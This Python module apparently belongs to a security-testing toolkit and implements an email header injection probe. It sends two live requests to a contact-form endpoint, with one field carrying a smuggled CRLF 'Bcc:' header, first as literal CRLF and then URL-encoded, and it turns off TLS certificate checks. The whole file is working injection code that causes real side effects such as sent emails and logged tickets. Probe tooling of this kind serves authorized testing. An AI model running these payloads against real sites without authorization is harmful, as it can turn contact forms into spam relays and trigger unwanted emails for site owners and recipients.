"""
Execution logic for email_header_injection_probe: sends exactly 2 real
write attempts against a contact-form submission endpoint, injecting a
CRLF-based Bcc header into one field's value -- (a) the literal CRLF
sequence, (b) the URL-encoded variant (for apps that decode before
validating). Each call is a genuine write/side effect against live
state (a ticket logged, an email sent), mirroring csrf_probe's exact
shape. No parsing here -- that's parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

DEFAULT_TIMEOUT = 10
DEFAULT_BCC_MARKER = "tradecraft-probe-marker@tradecraft-probe.test"


@dataclass
class RawEmailHeaderInjectionAttempt:
    variant: str  # "crlf_literal" or "crlf_urlencoded"
    status_code: int = 0
    body: str = ""
    error: Optional[str] = None


@dataclass
class RawEmailHeaderInjectionResult:
    target: str = ""
    method: str = ""
    field_to_inject: str = ""
    bcc_marker: str = ""
    attempts: List[RawEmailHeaderInjectionAttempt] = field(default_factory=list)
    error: Optional[str] = None


def parse_custom_headers(headers_str: Optional[str]) -> Dict[str, str]:
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"}
    if headers_str:
        for line in headers_str.splitlines():
            line = line.strip()
            if not line or ":" not in line:
                continue
            k, _, v = line.partition(":")
            headers[k.strip()] = v.strip()
    return headers


def execute(
    target: str,
    body: str,
    field_to_inject: str,
    method: str = "POST",
    bcc_marker: Optional[str] = None,
    headers: Optional[str] = None,
    timeout: int = DEFAULT_TIMEOUT,
) -> RawEmailHeaderInjectionResult:
    if requests is None:
        return RawEmailHeaderInjectionResult(target=target, error="requests library not available")

    try:
        baseline_body = json.loads(body) if body else {}
        if not isinstance(baseline_body, dict):
            raise ValueError("body must decode to a JSON object")
    except Exception as exc:
        return RawEmailHeaderInjectionResult(target=target, error=f"invalid 'body' JSON: {exc}")

    if not field_to_inject:
        return RawEmailHeaderInjectionResult(target=target, error="field_to_inject is required")

    http_method = (method or "POST").upper()
    if http_method not in ("POST", "PUT", "PATCH"):
        return RawEmailHeaderInjectionResult(target=target, error=f"unsupported method '{method}' (use POST/PUT/PATCH)")

    marker = bcc_marker or DEFAULT_BCC_MARKER
    original_value = str(baseline_body.get(field_to_inject, ""))

    variants = (
        ("crlf_literal", f"{original_value}\r\nBcc: {marker}"),
        ("crlf_urlencoded", f"{original_value}%0d%0aBcc:{marker}"),
    )

    req_headers = parse_custom_headers(headers)
    attempts: List[RawEmailHeaderInjectionAttempt] = []
    for variant_name, injected_value in variants:
        injected_body = dict(baseline_body)
        injected_body[field_to_inject] = injected_value
        try:
            resp = requests.request(
                http_method, target, json=injected_body, headers=req_headers,
                timeout=timeout, verify=False, allow_redirects=True,
            )
            attempts.append(RawEmailHeaderInjectionAttempt(
                variant=variant_name, status_code=resp.status_code, body=(resp.text or "")[:5000],
            ))
        except requests.RequestException as exc:
            attempts.append(RawEmailHeaderInjectionAttempt(variant=variant_name, error=str(exc)))
        except Exception as exc:
            attempts.append(RawEmailHeaderInjectionAttempt(variant=variant_name, error=f"{type(exc).__name__}: {exc}"))

    return RawEmailHeaderInjectionResult(
        target=target, method=http_method, field_to_inject=field_to_inject, bcc_marker=marker, attempts=attempts,
    )
